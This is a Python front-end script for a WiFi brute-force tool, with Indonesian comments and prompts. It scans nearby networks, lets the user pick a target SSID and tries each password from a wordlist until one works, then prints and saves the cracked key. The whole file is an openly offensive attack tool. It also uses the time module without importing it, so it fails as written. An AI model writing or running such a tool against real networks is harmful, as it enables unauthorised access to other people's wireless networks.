import sys
from core.engine import WifiBruter
from core.utils import clear, check_root, get_wordlist
from assets.branding import get_banner, log_status, R, G, W, Y

def main():
    clear()
    print(get_banner())
    check_root()

    # Inisialisasi Engine
    engine = WifiBruter(timeout=8) # Timeout dipersingkat agar lebih agresif
    
    log_status("Scanning nearby networks...")
    targets = engine.scan_targets()
    
    if not targets:
        log_status("No networks found!", "error")
        return

    print(f"\n{W}{'ID':<4} {'SSID':<25} {'BSSID':<20} {'SIGNAL'}")
    print("-" * 60)
    
    valid_targets = []
    for i, target in enumerate(targets):
        if target.ssid: # Filter SSID kosong
            valid_targets.append(target)
            print(f"{i:<4} {target.ssid:<25} {target.bssid:<20} {target.signal}")

    try:
        choice = int(input(f"\n{Y}Pilih target ID: {W}"))
        selected_ssid = valid_targets[choice].ssid
    except:
        log_status("Pilihan tidak valid!", "error")
        return

    wordlist_path = sys.argv[1] if len(sys.argv) > 1 else "data/passwords.txt"
    passwords = get_wordlist(wordlist_path)
    
    log_status(f"Starting attack on: {selected_ssid}")
    log_status(f"Wordlist: {len(passwords)} keys loaded\n")
    count = 0
    start_attack_time = time.time()

    try:
        for password in passwords:
            count += 1
            # Tampilan progres yang "clean" tapi gahar
            print(f"\r{W}[{Y}{count}/{len(passwords)}{W}] Testing: {R}{password:<20}{W}", end="")
            
            success = engine.attempt(selected_ssid, password)
            
            if success:
                print(f"\n\n{'='*50}")
                log_status(f"CRACKED SUCCESSFULLY!", "success")
                log_status(f"Target   : {selected_ssid}", "info")
                log_status(f"Password : {password}", "success")
                print(f"{'='*50}\n")
                
                engine.save_result(selected_ssid, password)
                break
            
            # Reset kecil setiap beberapa kali percobaan untuk menjaga stabilitas interface
            if count % 10 == 0:
                time.sleep(1) 

        else:
            print(f"\n\n{R}[!] Serangan selesai. Tidak ada password yang cocok.{W}")

    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Interrupted by user. Cleaning up...{W}")
        sys.exit()

    total_time = round(time.time() - start_attack_time, 2)
    log_status(f"Execution time: {total_time}s", "info")
    log_status("Result saved to data/logs.txt", "info")

if __name__ == "__main__":
    main()
